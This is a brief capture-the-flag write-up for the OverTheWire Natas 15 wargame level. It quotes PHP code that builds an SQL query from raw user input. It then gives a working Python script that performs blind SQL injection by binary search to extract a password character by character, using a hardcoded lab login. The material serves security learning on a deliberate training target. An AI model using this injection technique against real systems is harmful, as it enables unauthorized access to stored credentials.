It's a simple SQL Injecting as we examing the source code:

```php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
```

The volunability can't be more obvious: we need a payload like below:
```sql

```

```py
import requests

def test(i):
    url = "http://natas15.natas.labs.overthewire.org/index.php"

    l = 0
    r = 128

    # [l, r)
    while r - l > 1:
        this = (r+l)//2
        payload = f'natas16" and {this} <= ASCII(SUBSTRING(password, {i}, 1)) -- '
        res = requests.post(url, {"username": payload}, auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'))
        res = res.text.find('This user exists.') != -1
        if res:
            # target >= this
            l = this
        else:
            r = this

    return l

flag=""
for i in range(1, 64):
    flag += chr(test(i))
    print(flag)
```
